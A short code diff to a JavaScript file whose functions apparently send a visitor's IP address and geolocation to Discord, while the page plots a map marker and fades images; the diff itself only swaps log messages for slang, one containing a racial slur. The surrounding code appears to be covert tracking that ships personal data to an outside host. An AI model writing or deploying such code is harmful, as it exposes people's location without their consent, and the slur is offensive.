@@ -20,9 +20,9 @@ async function sendIPToDiscord() {
       body: JSON.stringify(dataIp)
     });
     if (responseIp.ok) {
-      console.log("IP message sent to Discord!");
+      console.log("lamoooo laughing eomij");
     } else {
-      console.error("Failed to send IP message to Discord.");
+      console.error("negawatt");
     }
   } catch (error) {
     console.error("An error occurred:", error);
@@ -51,10 +51,10 @@ async function handleLocation() {
         body: JSON.stringify(dataLocation)
       });
       if (responseLocation.ok) {
-        console.log("Location message sent to Discord!");
+        console.log("gang nigga gang fr");
         addMarker(locationInfo.latitude, locationInfo.longitude);
       } else {
-        console.error("Failed to send location message to Discord.");
+        console.error("blud what da heck");
       }
 
       // Fade in and out images
